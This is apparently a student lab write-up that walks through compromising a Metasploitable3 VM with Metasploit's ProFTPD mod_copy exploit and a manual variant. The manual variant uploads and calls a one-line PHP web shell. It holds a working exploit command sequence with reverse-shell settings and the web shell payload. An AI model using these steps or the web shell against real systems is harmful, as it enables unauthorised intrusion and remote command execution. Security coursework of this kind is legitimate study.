# Detailed Project Steps for Network Compromise, Analysis, and Defense

This document details Phases 1 of the ICS344 course project into a single, step-by-step guide, integrating key screenshots and outputs from our steps.

---

## 1. Project Setup & Initial Compromise (Phase 1)

### 1.1. Environment Deployment

1. **Victim Machine**: Deploy Metasploitable3‑ub1404 as the vulnerable target.
2. **Attacker Machine**: Deploy Kali Linux with Metasploit Framework.
3. **Network Configuration**: Ensure both machines are bridged on the same network (e.g., 10.0.2.0/24).

### 1.2. Identify & Exploit Vulnerable Service

1. **Choose Service**: Identify `proftpd` with `mod_copy` enabled on Metasploitable3.
2. **Launch Metasploit**:

   ```bash
   msfconsole -q
   use exploit/unix/ftp/proftpd_modcopy_exec
   set RHOST 10.0.2.15
   set RPORT 21
   set LHOST 10.0.2.12
   set LPORT 4444
   run
   ```
3. **Verify Shell**: On success, a shell session opens (`session 4`).

<figure>
  <img src="/mnt/data/74b60c98-e957-4b1f-98ec-432fffebd0fb.png" alt="Metasploit FTP mod_copy exploit output">
  <figcaption>Figure 1: Successful `proftpd_modcopy_exec` exploit via Metasploit.</figcaption>
</figure>

### 1.3. Manual Exploitation Script

> *Note: A custom Python script was developed to replicate the exploit steps via raw FTP commands and PHP payload upload.*

1. Connect to FTP, enable `mod_copy` commands.
2. Upload `<?php system($_GET['cmd']); ?>` as `999EYC.php` to `/var/www/html/`.
3. Execute via HTTP: `http://10.0.2.15/999EYC.php?cmd=whoami`.
4. Clean up by deleting the PHP file.

> *Screenshots of manual exploit steps and script output are included in the Phase 1 deliverable.*

---
